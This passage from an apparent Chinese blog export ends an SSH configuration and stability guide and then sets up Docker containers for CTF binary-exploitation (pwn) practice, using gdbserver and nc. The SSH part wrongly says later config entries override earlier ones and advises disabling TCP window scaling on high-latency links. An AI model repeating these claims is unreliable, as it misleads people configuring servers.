<li>每次执行 <code>ssh</code> 命令时，客户端会<strong>按固定顺序</strong>查找配置文件：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~/.ssh/config → /etc/ssh/ssh_config</span><br></pre></td></tr></table></figure></li>
<li>Windows 路径：<code>%USERPROFILE%\.ssh\config</code> → <code>C:\ProgramData\ssh\ssh_config</code></li>
</ul>
</li>
<li><p><strong>优先级规则</strong>：</p>
<ul>
<li>用户级配置 (<code>~/.ssh/config</code>) &gt; 系统级配置 (<code>/etc/ssh/ssh_config</code>)</li>
<li>文件中的配置从上到下生效，<strong>后出现的配置覆盖前面的</strong></li>
</ul>
</li>
<li><p><strong>加载验证方法</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加 -v 参数查看加载过程</span></span><br><span class="line">ssh <span class="literal">-v</span> user@server.com</span><br></pre></td></tr></table></figure>
<p>输出中会显示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">debug1: Reading configuration data /c/Users/21143/.ssh/config</span><br><span class="line">debug1: Applying options for *</span><br></pre></td></tr></table></figure></li>
</ol>
<h5 id="（1）为什么您需要手动创建文件？"><a href="#（1）为什么您需要手动创建文件？" class="headerlink" title="（1）为什么您需要手动创建文件？"></a>（1）为什么您需要手动创建文件？</h5><ol>
<li><p><strong>默认文件不存在</strong>：</p>
<ul>
<li>SSH 不会自动创建用户级配置文件</li>
<li>首次使用时需要手动创建</li>
</ul>
</li>
<li><p><strong>目录结构要求</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 必需的目录结构</span></span><br><span class="line">C:\Users\<span class="number">21143</span>\</span><br><span class="line">  └── .ssh/</span><br><span class="line">      ├── config          <span class="comment"># 配置文件</span></span><br><span class="line">      ├── id_rsa          <span class="comment"># 私钥</span></span><br><span class="line">      └── known_hosts     <span class="comment"># 已知主机记录</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>权限要求</strong>：</p>
<ul>
<li>必须设置严格权限（否则 SSH 会忽略配置）：</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">icacls <span class="variable">$env:USERPROFILE</span>\.ssh /inheritance:<span class="built_in">r</span></span><br><span class="line">icacls <span class="variable">$env:USERPROFILE</span>\.ssh /grant:<span class="built_in">r</span> <span class="string">&quot;<span class="variable">$env:USERNAME:</span>(F)&quot;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h5 id="（2）配置文件如何影响连接？"><a href="#（2）配置文件如何影响连接？" class="headerlink" title="（2）配置文件如何影响连接？"></a>（2）配置文件如何影响连接？</h5><p>当您执行 <code>ssh user@host</code> 时：</p>
<ol>
<li>客户端加载 <code>~/.ssh/config</code></li>
<li>匹配 <code>Host</code> 配置块（支持通配符）</li>
<li>应用配置参数到当前连接</li>
<li>命令行参数会覆盖配置文件设置</li>
</ol>
<h5 id="（3）配置示例解析"><a href="#（3）配置示例解析" class="headerlink" title="（3）配置示例解析"></a>（3）配置示例解析</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Host myserver            <span class="comment"># 定义主机别名</span></span><br><span class="line">  HostName 192.168.1.10  <span class="comment"># 真实IP/域名</span></span><br><span class="line">  User admin             <span class="comment"># 自动使用此用户名</span></span><br><span class="line">  Port 2222              <span class="comment"># 非标准端口</span></span><br><span class="line">  IdentityFile ~/.ssh/id_ecdsa  <span class="comment"># 指定私钥</span></span><br><span class="line"></span><br><span class="line">Host *                   <span class="comment"># 全局默认配置</span></span><br><span class="line">  ServerAliveInterval 30</span><br><span class="line">  TCPKeepAlive <span class="built_in">yes</span></span><br></pre></td></tr></table></figure>

<p>使用时：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 触发 myserver 配置块</span></span><br><span class="line">ssh myserver</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发全局配置 (*)</span></span><br><span class="line">ssh any<span class="literal">-other-server</span></span><br></pre></td></tr></table></figure>

<h5 id="（4）关键验证步骤"><a href="#（4）关键验证步骤" class="headerlink" title="（4）关键验证步骤"></a>（4）关键验证步骤</h5><ol>
<li><p>创建文件后执行：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 检查配置是否被加载</span></span><br><span class="line">ssh <span class="literal">-G</span> myserver | findstr <span class="string">&quot;ServerAliveInterval&quot;</span></span><br></pre></td></tr></table></figure>
<p>应输出：<code>serveraliveinterval 30</code></p>
</li>
<li><p>测试连接稳定性：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 观察是否还会超时断开</span></span><br><span class="line">ssh <span class="literal">-v</span> myserver</span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>只要文件路径正确、权限合规且语法无误，SSH 客户端 <strong>100% 会自动加载</strong> 此配置文件，无需额外操作。这是 OpenSSH 的标准行为，在 Windows&#x2F;Linux&#x2F;macOS 上完全一致。</p>
</blockquote>
<h4 id="3-断线重连工具"><a href="#3-断线重连工具" class="headerlink" title="3.断线重连工具"></a><code>3.断线重连工具</code></h4><ol>
<li><p><strong>使用<code>autossh</code>自动重连</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">autossh -M 0 -N -D 1080 user@server  <span class="comment"># -M 0禁用端口监控，专注重连</span></span><br></pre></td></tr></table></figure>
<p>安装：  </p>
<ul>
<li>Ubuntu&#x2F;Debian：<code>sudo apt install autossh</code>  </li>
<li>macOS：<code>brew install autossh</code></li>
</ul>
</li>
<li><p><strong>替代方案：<code>mosh</code>（移动SSH）</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 服务器端安装</span></span><br><span class="line"><span class="built_in">sudo</span> apt install mosh  </span><br><span class="line"><span class="comment"># 客户端连接（支持断线自动恢复）</span></span><br><span class="line">mosh user@server</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="4-会话持久化工具"><a href="#4-会话持久化工具" class="headerlink" title="4.会话持久化工具"></a><code>4.会话持久化工具</code></h4><ol>
<li><p><strong>使用<code>screen</code>或<code>tmux</code></strong>  </p>
<ul>
<li>在SSH会话中先启动<code>screen</code>或<code>tmux</code>，再执行长时间任务：  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -S mysession    <span class="comment"># 创建会话</span></span><br><span class="line"><span class="comment"># 执行任务（如编译、传输大文件）</span></span><br></pre></td></tr></table></figure></li>
<li>断线后重新连接，恢复会话：  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -r mysession    <span class="comment"># 恢复会话</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>后台运行命令</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> <span class="built_in">command</span> &amp;         <span class="comment"># 使命令不随SSH断开而终止</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="5-安全策略优化"><a href="#5-安全策略优化" class="headerlink" title="5.安全策略优化"></a><code>5.安全策略优化</code></h4><ol>
<li><p><strong>密钥认证替代密码</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen              <span class="comment"># 生成密钥对</span></span><br><span class="line">ssh-copy-id user@server <span class="comment"># 上传公钥到服务器</span></span><br></pre></td></tr></table></figure>
<p>禁用密码认证（<code>/etc/ssh/sshd_config</code>）：  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PasswordAuthentication no</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>调整登录限制</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 增加最大连接尝试次数</span></span><br><span class="line">MaxAuthTries 6</span><br><span class="line"><span class="comment"># 设置登录超时</span></span><br><span class="line">LoginGraceTime 30s</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="6-监控与告警"><a href="#6-监控与告警" class="headerlink" title="6.监控与告警"></a><code>6.监控与告警</code></h4><ol>
<li><p><strong>实时监控连接状态</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">watch -n 1 <span class="string">&#x27;ss -tunap | grep ssh&#x27;</span>  <span class="comment"># 实时查看SSH连接</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>日志分析工具</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">journalctl -u sshd -f  <span class="comment"># 实时查看SSH服务日志</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>告警机制</strong>  </p>
<ul>
<li>配置服务器监控工具（如Prometheus+Grafana），当SSH连接异常时发送通知。</li>
</ul>
</li>
</ol>
<h4 id="7-特殊场景解决方案"><a href="#7-特殊场景解决方案" class="headerlink" title="7.特殊场景解决方案"></a><code>7.特殊场景解决方案</code></h4><ol>
<li><p><strong>高延迟网络</strong>  </p>
<ul>
<li>降低TCP窗口缩放：  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 客户端临时设置</span></span><br><span class="line"><span class="built_in">sudo</span> sysctl -w net.ipv4.tcp_window_scaling=0</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>跨时区时钟同步</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install ntp    <span class="comment"># 安装NTP服务</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl restart ntp</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="8-测试与验证"><a href="#8-测试与验证" class="headerlink" title="8.测试与验证"></a><code>8.测试与验证</code></h4><ol>
<li><p><strong>网络连通性测试</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping server             <span class="comment"># 测试网络可达性</span></span><br><span class="line">traceroute server       <span class="comment"># 追踪路由路径</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>端口可用性测试</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -zv server 22        <span class="comment"># 测试SSH端口连通性</span></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>SSH</tag>
        <tag>隧道技术</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn专属Docker环境配置与操作</title>
    <url>/2025/12/02/Pwn%E4%B8%93%E5%B1%9EDocker%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E4%B8%8E%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h2 id="一、环境前置准备"><a href="#一、环境前置准备" class="headerlink" title="一、环境前置准备"></a>一、环境前置准备</h2><h3 id="1-验证现有Ubuntu镜像"><a href="#1-验证现有Ubuntu镜像" class="headerlink" title="1. 验证现有Ubuntu镜像"></a>1. 验证现有Ubuntu镜像</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
<ul>
<li>预期结果：需包含 <code>ubuntu:16.04</code>、<code>ubuntu:18.04</code>、<code>ubuntu:20.04</code> 三个镜像</li>
</ul>
<h3 id="2-拉取缺失镜像（若验证不通过）"><a href="#2-拉取缺失镜像（若验证不通过）" class="headerlink" title="2. 拉取缺失镜像（若验证不通过）"></a>2. 拉取缺失镜像（若验证不通过）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Ubuntu 16.04（对应libc-2.23，端口9997）</span></span><br><span class="line">docker pull ubuntu:16.04</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu 18.04（对应libc-2.27，端口9998）</span></span><br><span class="line">docker pull ubuntu:18.04</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu 20.04（对应libc-2.31，端口9999）</span></span><br><span class="line">docker pull ubuntu:20.04</span><br></pre></td></tr></table></figure>

<h2 id="二、核心容器创建（3个Pwn专用环境）"><a href="#二、核心容器创建（3个Pwn专用环境）" class="headerlink" title="二、核心容器创建（3个Pwn专用环境）"></a>二、核心容器创建（3个Pwn专用环境）</h2><h3 id="容器1：Ubuntu-16-04-libc-2-23"><a href="#容器1：Ubuntu-16-04-libc-2-23" class="headerlink" title="容器1：Ubuntu 16.04 + libc-2.23"></a>容器1：Ubuntu 16.04 + libc-2.23</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it --privileged \</span><br><span class="line">  -v ~/Pwn/myPwn:/root/myPwn \  <span class="comment"># 本地仓库挂载到容器</span></span><br><span class="line">  -p 9997:9997 \                                  <span class="comment"># 端口映射（主机:容器）</span></span><br><span class="line">  --name pwn-2.23 \                               <span class="comment"># 容器名称</span></span><br><span class="line">  ubuntu:16.04 /bin/bash</span><br></pre></td></tr></table></figure>
<p>容器内首次启动需执行（安装调试工具）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt install -y gdbserver net-tools git</span><br></pre></td></tr></table></figure>

<h3 id="容器2：Ubuntu-18-04-libc-2-27"><a href="#容器2：Ubuntu-18-04-libc-2-27" class="headerlink" title="容器2：Ubuntu 18.04 + libc-2.27"></a>容器2：Ubuntu 18.04 + libc-2.27</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it --privileged \</span><br><span class="line">  -v ~/Pwn/myPwn:/root/myPwn \</span><br><span class="line">  -p 9998:9998 \</span><br><span class="line">  --name pwn-2.27 \</span><br><span class="line">  ubuntu:18.04 /bin/bash</span><br></pre></td></tr></table></figure>
<p>容器内首次启动需执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt install -y gdbserver net-tools git</span><br></pre></td></tr></table></figure>

<h3 id="容器3：Ubuntu-20-04-libc-2-31"><a href="#容器3：Ubuntu-20-04-libc-2-31" class="headerlink" title="容器3：Ubuntu 20.04 + libc-2.31"></a>容器3：Ubuntu 20.04 + libc-2.31</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it --privileged \</span><br><span class="line">  -v ~/Pwn/myPwn:/root/myPwn \</span><br><span class="line">  -p 9999:9999 \</span><br><span class="line">  --name pwn-2.31 \</span><br><span class="line">  ubuntu:20.04 /bin/bash</span><br></pre></td></tr></table></figure>
<p>容器内首次启动需执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt install -y gdbserver net-tools git</span><br></pre></td></tr></table></figure>

<h2 id="三、容器日常管理指令"><a href="#三、容器日常管理指令" class="headerlink" title="三、容器日常管理指令"></a>三、容器日常管理指令</h2><h3 id="1-启动容器"><a href="#1-启动容器" class="headerlink" title="1. 启动容器"></a>1. 启动容器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动单个容器（示例：pwn-2.27）</span></span><br><span class="line">docker start pwn-2.27</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动所有Pwn容器（一键操作）</span></span><br><span class="line">docker start pwn-2.23 pwn-2.27 pwn-2.31</span><br></pre></td></tr></table></figure>

<h3 id="2-进入已启动的容器"><a href="#2-进入已启动的容器" class="headerlink" title="2. 进入已启动的容器"></a>2. 进入已启动的容器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入单个容器（示例：pwn-2.27）</span></span><br><span class="line">docker <span class="built_in">exec</span> -it pwn-2.27 /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入其他容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it pwn-2.23 /bin/bash  <span class="comment"># 16.04环境</span></span><br><span class="line">docker <span class="built_in">exec</span> -it pwn-2.31 /bin/bash  <span class="comment"># 20.04环境</span></span><br></pre></td></tr></table></figure>

<h3 id="3-停止容器"><a href="#3-停止容器" class="headerlink" title="3. 停止容器"></a>3. 停止容器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 停止单个容器（示例：pwn-2.27）</span></span><br><span class="line">docker stop pwn-2.27</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止所有Pwn容器</span></span><br><span class="line">docker stop pwn-2.23 pwn-2.27 pwn-2.31</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止所有运行中的容器（快速清理）</span></span><br><span class="line">docker stop $(docker ps -q)</span><br></pre></td></tr></table></figure>

<h3 id="4-查看容器状态"><a href="#4-查看容器状态" class="headerlink" title="4. 查看容器状态"></a>4. 查看容器状态</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看运行中的容器</span></span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有容器（运行中+已停止）</span></span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<h3 id="5-重启容器（解决卡死或配置生效）"><a href="#5-重启容器（解决卡死或配置生效）" class="headerlink" title="5. 重启容器（解决卡死或配置生效）"></a>5. 重启容器（解决卡死或配置生效）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 示例：重启pwn-2.27</span></span><br><span class="line">docker restart pwn-2.27</span><br></pre></td></tr></table></figure>

<h2 id="四、Pwn调试核心操作"><a href="#四、Pwn调试核心操作" class="headerlink" title="四、Pwn调试核心操作"></a>四、Pwn调试核心操作</h2><h3 id="1-单步调试模式（推荐）"><a href="#1-单步调试模式（推荐）" class="headerlink" title="1. 单步调试模式（推荐）"></a>1. 单步调试模式（推荐）</h3><p>进入对应容器后，执行以下步骤（替换题目路径&#x2F;文件名）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入题目目录（示例）</span></span><br><span class="line"><span class="built_in">cd</span> /root/myPwn/babyheap-2.27</span><br><span class="line"></span><br><span class="line"><span class="comment"># 赋予执行权限</span></span><br><span class="line"><span class="built_in">chmod</span> +x ./babyheap</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动gdbserver（等待主机连接）</span></span><br><span class="line">gdbserver 0.0.0.0:9998 ./babyheap</span><br></pre></td></tr></table></figure>
<ul>
<li>成功标志：容器内显示 <code>Listening on port 9998</code></li>
</ul>
<h3 id="2-快速测试模式（无需单步调试）"><a href="#2-快速测试模式（无需单步调试）" class="headerlink" title="2. 快速测试模式（无需单步调试）"></a>2. 快速测试模式（无需单步调试）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/myPwn/题目文件夹名</span><br><span class="line"><span class="built_in">chmod</span> +x ./题目文件名</span><br><span class="line">./题目文件名 | nc -l 0.0.0.0 9998  <span class="comment"># 用nc转发端口</span></span><br></pre></td></tr></table></figure>

<h3 id="3-验证端口监听状态（排查连接问题）"><a href="#3-验证端口监听状态（排查连接问题）" class="headerlink" title="3. 验证端口监听状态（排查连接问题）"></a>3. 验证端口监听状态（排查连接问题）</h3><p>容器内执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -tuln</span><br></pre></td></tr></table></figure>
<ul>
<li>预期结果：调试时对应端口（9997&#x2F;9998&#x2F;9999）显示为 <code>LISTEN</code> 状态</li>
</ul>
<h3 id="4-主机与容器文件互传（应急用）"><a href="#4-主机与容器文件互传（应急用）" class="headerlink" title="4. 主机与容器文件互传（应急用）"></a>4. 主机与容器文件互传（应急用）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主机 → 容器（示例：传exp.py到pwn-2.27）</span></span><br><span class="line">docker <span class="built_in">cp</span> ~/Pwn/myPwn/exp.py pwn-2.27:/root/myPwn/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 容器 → 主机（示例：传flag.txt到本地）</span></span><br><span class="line">docker <span class="built_in">cp</span> pwn-2.27:/root/myPwn/flag.txt ~/Pwn/</span><br></pre></td></tr></table></figure>

<h2 id="五、容器退出方式"><a href="#五、容器退出方式" class="headerlink" title="五、容器退出方式"></a>五、容器退出方式</h2><h3 id="1-退出后停止容器（调试完成）"><a href="#1-退出后停止容器（调试完成）" class="headerlink" title="1. 退出后停止容器（调试完成）"></a>1. 退出后停止容器（调试完成）</h3><p>容器内输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<ul>
<li>效果：返回主机终端，容器状态变为 <code>Exited</code></li>
</ul>
<h3 id="2-退出后保留运行（暂时离开）"><a href="#2-退出后保留运行（暂时离开）" class="headerlink" title="2. 退出后保留运行（暂时离开）"></a>2. 退出后保留运行（暂时离开）</h3><p>容器内按组合键：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ctrl + P + Q  <span class="comment"># 先按Ctrl+P，再按Ctrl+Q（顺序不可换）</span></span><br></pre></td></tr></table></figure>
<ul>
<li>效果：返回主机终端，容器仍在后台运行（状态为 <code>Up</code>）</li>
</ul>
<h2 id="六、镜像管理（备份-恢复）"><a href="#六、镜像管理（备份-恢复）" class="headerlink" title="六、镜像管理（备份&#x2F;恢复）"></a>六、镜像管理（备份&#x2F;恢复）</h2><h3 id="1-查看本地镜像"><a href="#1-查看本地镜像" class="headerlink" title="1. 查看本地镜像"></a>1. 查看本地镜像</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<h3 id="2-备份镜像（换设备-重装系统）"><a href="#2-备份镜像（换设备-重装系统）" class="headerlink" title="2. 备份镜像（换设备&#x2F;重装系统）"></a>2. 备份镜像（换设备&#x2F;重装系统）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建备份目录</span></span><br><span class="line"><span class="built_in">mkdir</span> -p ~/docker-backup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份单个镜像（示例：ubuntu:18.04）</span></span><br><span class="line">docker save -o ~/docker-backup/ubuntu18.04-pwn.tar ubuntu:18.04</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份所有Pwn基础镜像</span></span><br><span class="line">docker save -o ~/docker-backup/ubuntu-all-pwn.tar ubuntu:16.04 ubuntu:18.04 ubuntu:20.04</span><br></pre></td></tr></table></figure>

<h3 id="3-恢复备份的镜像"><a href="#3-恢复备份的镜像" class="headerlink" title="3. 恢复备份的镜像"></a>3. 恢复备份的镜像</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 恢复单个镜像（示例：ubuntu:18.04）</span></span><br><span class="line">docker load -i ~/docker-backup/ubuntu18.04-pwn.tar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复所有镜像</span></span><br><span class="line">docker load -i ~/docker-backup/ubuntu-all-pwn.tar</span><br></pre></td></tr></table></figure>

<h3 id="4-删除镜像（谨慎操作）"><a href="#4-删除镜像（谨慎操作）" class="headerlink" title="4. 删除镜像（谨慎操作）"></a>4. 删除镜像（谨慎操作）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先删除依赖容器，再删除镜像（示例：ubuntu:16.04）</span></span><br><span class="line">docker stop pwn-2.23 &amp;&amp; docker <span class="built_in">rm</span> pwn-2.23</span><br><span class="line">docker rmi ubuntu:16.04</span><br></pre></td></tr></table></figure>

<h2 id="七、容器删除（谨慎使用）"><a href="#七、容器删除（谨慎使用）" class="headerlink" title="七、容器删除（谨慎使用）"></a>七、容器删除（谨慎使用）</h2><h3 id="1-删除单个容器"><a href="#1-删除单个容器" class="headerlink" title="1. 删除单个容器"></a>1. 删除单个容器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先停止，再删除（示例：pwn-2.23）</span></span><br><span class="line">docker stop pwn-2.23 &amp;&amp; docker <span class="built_in">rm</span> pwn-2.23</span><br></pre></td></tr></table></figure>

<h3 id="2-清理所有已停止的容器"><a href="#2-清理所有已停止的容器" class="headerlink" title="2. 清理所有已停止的容器"></a>2. 清理所有已停止的容器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> $(docker ps -a -q)</span><br></pre></td></tr></table></figure>

<h3 id="3-强制删除运行中的容器（不推荐）"><a href="#3-强制删除运行中的容器（不推荐）" class="headerlink" title="3. 强制删除运行中的容器（不推荐）"></a>3. 强制删除运行中的容器（不推荐）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> -f pwn-2.23</span><br></pre></td></tr></table></figure>

<h2 id="八、问题排查指令"><a href="#八、问题排查指令" class="headerlink" title="八、问题排查指令"></a>八、问题排查指令</h2><h3 id="1-查看容器详细配置（IP-挂载-端口）"><a href="#1-查看容器详细配置（IP-挂载-端口）" class="headerlink" title="1. 查看容器详细配置（IP&#x2F;挂载&#x2F;端口）"></a>1. 查看容器详细配置（IP&#x2F;挂载&#x2F;端口）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看pwn-2.27详细信息</span></span><br><span class="line">docker inspect pwn-2.27</span><br><span class="line"></span><br><span class="line"><span class="comment"># 快速获取容器IP</span></span><br><span class="line">docker inspect pwn-2.27 | grep <span class="string">&quot;IPAddress&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-查看容器运行日志（题目崩溃-报错时）"><a href="#2-查看容器运行日志（题目崩溃-报错时）" class="headerlink" title="2. 查看容器运行日志（题目崩溃&#x2F;报错时）"></a>2. 查看容器运行日志（题目崩溃&#x2F;报错时）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看pwn-2.27日志</span></span><br><span class="line">docker logs pwn-2.27</span><br></pre></td></tr></table></figure>

<h3 id="3-检查端口映射是否生效"><a href="#3-检查端口映射是否生效" class="headerlink" title="3. 检查端口映射是否生效"></a>3. 检查端口映射是否生效</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看所有容器端口映射</span></span><br><span class="line">docker port $(docker ps -q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看单个容器映射（示例：pwn-2.27）</span></span><br><span class="line">docker port pwn-2.27</span><br></pre></td></tr></table></figure>

<h2 id="九、快捷指令（一键复用）"><a href="#九、快捷指令（一键复用）" class="headerlink" title="九、快捷指令（一键复用）"></a>九、快捷指令（一键复用）</h2><ol>
<li>一键启动所有容器并进入pwn-2.27：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start pwn-2.23 pwn-2.27 pwn-2.31 &amp;&amp; docker <span class="built_in">exec</span> -it pwn-2.27 /bin/bash</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>一键停止所有容器并查看状态：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop pwn-2.23 pwn-2.27 pwn-2.31 &amp;&amp; docker ps -a</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>容器内快速启动题目（pwn-2.27示例）：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/myPwn/题目文件夹名 &amp;&amp; <span class="built_in">chmod</span> +x ./题目文件名 &amp;&amp; gdbserver 0.0.0.0:9998 ./题目文件名</span><br></pre></td></tr></table></figure>

<h2 id="十、核心配置对照表"><a href="#十、核心配置对照表" class="headerlink" title="十、核心配置对照表"></a>十、核心配置对照表</h2><table>
<thead>
<tr>
<th align="left">容器名</th>
<th align="left">Ubuntu版本</th>
<th align="left">libc版本</th>
<th align="left">映射端口</th>
<th align="left">本地挂载路径</th>
<th align="left">容器内挂载路径</th>
</tr>
</thead>
<tbody><tr>
<td align="left">pwn-2.23</td>
<td align="left">16.04</td>
<td align="left">2.23</td>
<td align="left">9997</td>
<td align="left">~&#x2F;Pwn&#x2F;myPwn</td>
<td align="left">&#x2F;root&#x2F;myPwn</td>
</tr>
<tr>
<td align="left">pwn-2.27</td>
<td align="left">18.04</td>
<td align="left">2.27</td>
<td align="left">9998</td>
<td align="left">~&#x2F;Pwn&#x2F;myPwn</td>
<td align="left">&#x2F;root&#x2F;myPwn</td>
</tr>
<tr>
<td align="left">pwn-2.31</td>
<td align="left">20.04</td>
<td align="left">2.31</td>
<td align="left">9999</td>
<td align="left">~&#x2F;Pwn&#x2F;myPwn</td>
<td align="left">&#x2F;root&#x2F;myPwn</td>
</tr>
</tbody></table>
<h2 id="十一、日常调试流程总结"><a href="#十一、日常调试流程总结" class="headerlink" title="十一、日常调试流程总结"></a>十一、日常调试流程总结</h2><ol>
<li>启动容器：<code>docker start pwn-2.27</code>（按需替换容器名）</li>
<li>进入容器：<code>docker exec -it pwn-2.27 /bin/bash</code></li>
<li>启动题目：<code>cd /root/myPwn/题目目录 &amp;&amp; gdbserver 0.0.0.0:9998 ./题目名</code></li>
<li>主机调试：激活Python环境 → 运行脚本（连接对应端口）</li>
<li>结束操作：<code>exit</code>（退出容器）→ <code>docker stop pwn-2.27</code>（停止容器）</li>
</ol>
